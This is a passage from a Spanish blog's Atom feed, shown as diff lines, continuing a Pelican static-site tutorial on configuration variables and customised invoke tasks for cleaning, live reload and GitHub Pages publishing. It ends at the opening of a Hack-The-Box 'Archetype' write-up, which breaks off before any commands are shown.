+&lt;p&gt;Bien, ya hemos modificado la ruta de salida, por lo que podemos configurar
+otras variables que le dan más vida al&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;Las siguientes variables las configuraremos en &lt;code&gt;pelicanconf.py&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;AUTHOR&lt;/code&gt;: Nombre del autor del&amp;nbsp;sitio&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SITENAME&lt;/code&gt;: Nombre del&amp;nbsp;sitio&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SITESUBTITLE&lt;/code&gt;: Subtitulo del&amp;nbsp;sitio&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;TYPOGRIFY&lt;/code&gt;: La asignaremos como &lt;code&gt;True&lt;/code&gt; para procesar las tipografías y el
+texto del sitio y que tengan mejor&amp;nbsp;presentación.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;GITHUB_URL&lt;/code&gt;: &lt;span class="caps"&gt;URL&lt;/span&gt; para el perfil de &lt;code&gt;GitHub&lt;/code&gt;, aparecerá un botón para hacer
+fork al&amp;nbsp;sitio.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LINKS&lt;/code&gt;: Literalmente es una lista de enlaces que quieres que aparezcan en el&amp;nbsp;sitio.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SOCIAL&lt;/code&gt;: La lista de enlaces a tus redes&amp;nbsp;sociales.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Tanto la sintaxis de &lt;code&gt;LINKS&lt;/code&gt; como la de &lt;code&gt;SOCIAL&lt;/code&gt; es la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;VARIABLE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;enalce 1&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;http://url-1.com/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
+            &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;enalce 2&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;http://url-2.com/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
+            &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;enalce 3&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;http://url-3.com/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Las siguientes variables las configuraremos en &lt;code&gt;publishconf.py&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SITEURL&lt;/code&gt;: &lt;span class="caps"&gt;URL&lt;/span&gt; del sitio, tiene que incluir http o https al inicio, por
+ejemplo&amp;nbsp;https://sitio.com&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;DELETE_OUTPUT_DIRECTORY&lt;/code&gt;: Dado que no queremos eliminar el directorio de
+salida ya que ahí se encuentra nuestra carpeta de &lt;code&gt;pelican&lt;/code&gt; vamos a cambiar su
+valor a &lt;code&gt;False&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Recuerda que las variables tienen un formato de &lt;code&gt;VARIABLE = valor&lt;/code&gt;. El nombre
+de la variable va en mayúsculas seguida de un espacio, el símbolo de &lt;code&gt;=&lt;/code&gt;, otro
+espacio y el valor de la&amp;nbsp;variable.&lt;/p&gt;
+&lt;p&gt;Si quieres ver como van quedando los archivos de configuración de este sitio
+puedes revisar &lt;a href="https://github.com/penserbjorne/penserbjorne.github.io/blob/master/pelican/pelicanconf.py"&gt;aquí (pelicanconf.py)&lt;/a&gt; y
+&lt;a href="https://github.com/penserbjorne/penserbjorne.github.io/blob/master/pelican/publishconf.py"&gt;aquí (publishconf.py)&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Modificando el pipeline de construcción del&amp;nbsp;sitio&lt;/h2&gt;
+&lt;p&gt;Ok, ya tenemos instaladas las herramientas para construir el sitio y hemos
+configurado algunas variables para que tenga un poco más de personalidad el
+sitio, eso significa que podemos&amp;nbsp;generarlo.&lt;/p&gt;
+&lt;p&gt;Los pasos a ir siguiendo son sencillos y deben estar pensados en dos momentos:
+desarrollo y&amp;nbsp;producción.&lt;/p&gt;
+&lt;p&gt;Durante el desarrollo queremos ir viendo los cambios que vamos realizando en
+local, así que podemos&amp;nbsp;utilizar:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Limpiamos archivos previos&lt;/span&gt;
+invoke clean
+&lt;span class="c1"&gt;# Comenzamos a generar sobre el vuelo&lt;/span&gt;
+invoke livereload
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Cuando hemos terminado de probar queremos construir el sitio para producción y
+enviarlo a nuestro repositorio de &lt;code&gt;GitHub&lt;/code&gt;, por lo que podemos&amp;nbsp;utilizar:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Limpiamos archivo previos&lt;/span&gt;
+invoke clean
+&lt;span class="c1"&gt;# Generamos versión de producción y publicamos actualizaciones&lt;/span&gt;
+invoke gh-pages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pero tenemos un problema, la tarea &lt;code&gt;clean&lt;/code&gt; va a borrar todo en el contenido de
+salida, esto incluiría la carpeta &lt;code&gt;pelican&lt;/code&gt; por lo cual perderíamos los archivos
+fuente del blog. Hay que modificar esta tarea&amp;nbsp;:)&lt;/p&gt;
+&lt;p&gt;Y como queremos que todo quede en un solo comando tanto para producción como
+para publicar el sitio vamos a hacer algunos cambios más que veremos a&amp;nbsp;continuación.&lt;/p&gt;
+&lt;p&gt;Para modificar las tareas nos vamos a dirigir al archivo &lt;code&gt;tasks.py&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Modificando la tarea &lt;code&gt;clean&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;Vamos a comentar las lineas que se encuentran dentro de la tarea y las vamos a
+reemplazar por el siguiente segmento de&amp;nbsp;código:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;deploy_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;
+      &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rm -rf ../author ../category ../drafts ../feeds ../tag ../theme &amp;#39;&lt;/span&gt;
+              &lt;span class="s1"&gt;&amp;#39;../*.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;De tal modo que la tarea se vería más o menos&amp;nbsp;así:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nd"&gt;@task&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Remove generated files&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+    &lt;span class="c1"&gt;# Old code&lt;/span&gt;
+    &lt;span class="c1"&gt;#if os.path.isdir(CONFIG[&amp;#39;deploy_path&amp;#39;]):&lt;/span&gt;
+    &lt;span class="c1"&gt;#    shutil.rmtree(CONFIG[&amp;#39;deploy_path&amp;#39;])&lt;/span&gt;
+    &lt;span class="c1"&gt;#    os.makedirs(CONFIG[&amp;#39;deploy_path&amp;#39;])&lt;/span&gt;
+
+    &lt;span class="c1"&gt;#My own code&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;deploy_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;
+        &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rm -rf ../author ../category ../drafts ../feeds ../tag ../theme &amp;#39;&lt;/span&gt;
+                &lt;span class="s1"&gt;&amp;#39;../*.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Modificando la tarea &lt;code&gt;livereload&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;Queremos que cada vez que se haga un &lt;code&gt;livereload&lt;/code&gt; también se limpien los
+archivos generados previamente, por lo cual vamos a añadir la tarea &lt;code&gt;clean&lt;/code&gt;
+dentro de &lt;code&gt;livereload&lt;/code&gt;, para esto solamente añadiremos la linea &lt;code&gt;clean(c)&lt;/code&gt; antes
+&lt;code&gt;build(c)&lt;/code&gt;, de tal modo que la tarea quedaría&amp;nbsp;así:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nd"&gt;@task&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;livereload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Automatically reload browser tab upon file modification.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;livereload&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
+    &lt;span class="n"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c1"&gt;# New line, added by me :)&lt;/span&gt;
+    &lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="c1"&gt;# Watch the base settings file&lt;/span&gt;
+    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;watch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;settings_base&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="c1"&gt;# Watch content source files&lt;/span&gt;
+    &lt;span class="n"&gt;content_file_extensions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.md&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.rst&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;extension&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;content_file_extensions&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;content_blob&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s1"&gt;/**/*&lt;/span&gt;&lt;span class="si"&gt;{1}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SETTINGS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PATH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;extension&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;watch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content_blob&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="c1"&gt;# Watch the theme&amp;#39;s templates and static assets&lt;/span&gt;
+    &lt;span class="n"&gt;theme_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SETTINGS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;THEME&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;watch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;/templates/*.html&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;theme_path&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;static_file_extensions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.css&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;extension&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;static_file_extensions&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;static_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s1"&gt;/static/**/*&lt;/span&gt;&lt;span class="si"&gt;{1}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;theme_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;extension&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;watch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;static_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="c1"&gt;# Serve output path on configured port&lt;/span&gt;
+    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;port&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;deploy_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Modificando la tarea &lt;code&gt;gh-pages&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;De igual manera  que en la tarea anterior, simplemente vamos a añadir la linea
+de &lt;code&gt;clean(c)&lt;/code&gt; para verificar que no haya basura. La linea a añadir la ubicaremos
+antes de la linea &lt;code&gt;preview(c)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Y por alguna razón en este momento estamos teniendo problemas con &lt;code&gt;ghp-import&lt;/code&gt;
+por lo que vamos a añadir lo&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;git add --all&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;git commit -m &lt;/span&gt;&lt;span class="si"&gt;{commit_message}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;git push&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La tarea quedaría de la siguiente&amp;nbsp;manera:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nd"&gt;@task&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;gh_pages&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Publish to GitHub Pages&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+    &lt;span class="n"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;preview&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# Old code&lt;/span&gt;
+    &lt;span class="c1"&gt;#c.run(&amp;#39;ghp-import -b {github_pages_branch} &amp;#39;&lt;/span&gt;
+    &lt;span class="c1"&gt;#      &amp;#39;-m {commit_message} &amp;#39;&lt;/span&gt;
+    &lt;span class="c1"&gt;#      &amp;#39;{deploy_path} -p&amp;#39;.format(**CONFIG))&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# My code&lt;/span&gt;
+    &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;git add --all&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;git commit -m &lt;/span&gt;&lt;span class="si"&gt;{commit_message}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;CONFIG&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;git push&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos ver que el nombre de la función dentro de &lt;code&gt;tasks.py&lt;/code&gt; lleva guion bajo
+mientras que al utilizarlo con &lt;code&gt;invoke&lt;/code&gt; lleva guion medio, esto no sé porque
+sea pero hay que dejarlo&amp;nbsp;así.&lt;/p&gt;
+&lt;p&gt;Y consideremos que dentro del archivo &lt;code&gt;tasks.py&lt;/code&gt; existen las variables &lt;code&gt;github_pages_branch&lt;/code&gt; y &lt;code&gt;commit_message&lt;/code&gt; que son a las que se hace referencia
+en la&amp;nbsp;tarea.&lt;/p&gt;
+&lt;h2&gt;Pasos resultantes para construir el&amp;nbsp;sitio&lt;/h2&gt;
+&lt;p&gt;Con los cambios anteriores nuestro pequeño ciclo de desarrollo&amp;nbsp;quedaría:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Desarrollo&lt;/span&gt;
+invoke livereload
+
+&lt;span class="c1"&gt;# Producción&lt;/span&gt;
+invoke gh-pages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto hemos automatizado un poco nuestro pequeño ciclo de desarrollo del&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;Para ver el archivo &lt;code&gt;tasks.py&lt;/code&gt; de este blog puedes dar click
+&lt;a href="https://github.com/penserbjorne/penserbjorne.github.io/blob/master/pelican/tasks.py"&gt;aquí&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Siguientes&amp;nbsp;pasos&lt;/h2&gt;
+&lt;p&gt;Ya tenemos nuestro sitio con un poco mas de estilo, sin embargo sigue sin ser
+responsivo por lo cual no es fácil de leer en dispositivos con pantallas
+medianas o pequeñas, el siguiente paso es configurar un tema responsivo, pero
+esto lo haremos en la siguiente entrada&amp;nbsp;:)&lt;/p&gt;
+&lt;p&gt;Que la fuerza te&amp;nbsp;acompañe.&lt;/p&gt;</content><category term="pelican"></category><category term="blog"></category><category term="pelican"></category></entry><entry><title>Hack-The-Box (0002) &gt; Starting Point &gt; Archetype</title><link href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html" rel="alternate"></link><published>2020-08-07T00:00:00-05:00</published><updated>2021-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-07:/hack-the-box-0002-starting-point-archetype-es-MX.html</id><summary type="html">&lt;p&gt;Anotaciones sobre la máquina &amp;#8220;Archetype&amp;#8221; de la sección &amp;#8220;Starting Point&amp;#8221; de&amp;nbsp;Hack-The-Box&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Archetype&lt;/h2&gt;
+&lt;p&gt;Para comenzar con esta serie de anotaciones sobre la sección &lt;em&gt;Starting Point&lt;/em&gt;
+arrancaremos con la máquina &lt;em&gt;Archetype&lt;/em&gt;. Si no sabes bien de que hablo te
+recomiendo que primero leas la
+&lt;a href="https://penserbjorne.com/hack-the-box-0001-starting-point-es-MX.html"&gt;entrada anterior&lt;/a&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Máquina:&lt;/strong&gt;&amp;nbsp;Archetype&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;span class="caps"&gt;SO&lt;/span&gt;:&lt;/strong&gt;&amp;nbsp;Windows&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;span class="caps"&gt;IP&lt;/span&gt;:&lt;/strong&gt;&amp;nbsp;10.10.10.27&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Como siempre digo: &amp;#8220;&lt;em&gt;primero lo primero&lt;/em&gt;&amp;#8220;, pues vamos a comenzar a &lt;strong&gt;enumerar&lt;/strong&gt;
+lo que tiene el equipo objetivo, en este caso vamos a tratar de identificar
+los puertos abiertos y el software asociado a&amp;nbsp;estos.&lt;/p&gt;
+&lt;p&gt;Para esto utilizaremos la siempre poderosa herramienta de
+&lt;a href="https://es.wikipedia.org/wiki/Nmap"&gt;nmap&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Lo primero que nos recomiendan utilizar son los siguientes dos&amp;nbsp;comandos:&lt;/p&gt;
